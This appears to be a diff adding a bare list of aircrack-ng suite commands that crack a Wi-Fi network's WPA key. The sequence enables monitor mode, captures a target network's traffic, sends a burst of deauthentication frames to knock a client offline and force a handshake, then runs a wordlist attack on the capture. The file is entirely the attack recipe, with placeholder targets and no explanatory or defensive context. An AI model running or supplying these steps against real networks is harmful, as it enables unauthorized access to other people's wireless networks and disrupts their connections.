@@ -1,0 +1,10 @@
+sudo airmon-ng start wlp0s20f3
+
+sudo airodump-ng wlp0s20f3mon
+sudo airmon-ng check kill
+
+sudo airodump-ng --bssid <TARGET BSSID> -w <TARGET ESSID> wlp0s20f3mon
+
+sudo aireplay-ng --deauth 100 -a <TARGET BSSID> -c <TARGET MAC ADDRESS> wlp0s20f3mon
+
+aircrack-ng -w <PATH TO WORDLIST> -b <TARGET BSSID> <TARGET ESSID>*.cap
